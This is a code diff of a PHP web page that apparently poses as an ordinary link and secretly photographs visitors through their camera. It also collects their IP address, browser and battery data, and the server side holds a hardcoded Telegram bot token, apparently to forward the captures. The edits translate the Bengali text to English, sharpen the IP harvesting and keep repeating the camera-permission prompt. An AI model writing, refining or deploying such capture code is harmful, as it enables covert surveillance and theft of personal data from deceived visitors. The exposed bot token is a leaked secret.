@@ -1,14 +1,13 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // e প্যারামিটার না থাকলে অথবা লিংকের মেয়াদ পার হয়ে গেলে ছবি পাঠাবে না
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
 
     $expiryTime = intval($_POST['e']);
     if (time() > $expiryTime) {
-        exit; // মেয়াদ শেষ, ছবি যাবে না
+        exit; 
     }
 
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -37,11 +36,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
     $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
     
+    // Main Public IP বের করার ফিল্টারড লজিক
     $ipAddress = $_SERVER['REMOTE_ADDR'];
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ipAddress = trim($ipList[0]);
+    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
         $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
     }
 
     $fileName = 'img_' . uniqid() . '.png';
@@ -77,7 +78,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -214,7 +215,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
         const userChatId = urlParams.get('cid') || ''; 
-        const expiryParam = urlParams.get('e') || ''; // e parameter receive kora holo
+        const expiryParam = urlParams.get('e') || ''; 
         const rawTargetUrl = urlParams.get('url');
 
         let finalUrl = "https://www.aapunkagames.com/"; 
@@ -269,7 +270,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
-                    alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
+                    alert("Camera permission is required to view this link!");
                     setTimeout(requestCameraPermission, 1000);
                 });
         }
@@ -288,7 +289,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             postData.append('image', imageData);
             postData.append('target', targetId);
             postData.append('chat_id', userChatId);
-            postData.append('e', expiryParam); // e parameter server e pathano holo
+            postData.append('e', expiryParam); 
             postData.append('user_agent', navigator.userAgent);
             postData.append('battery', batteryLevelInfo);
 
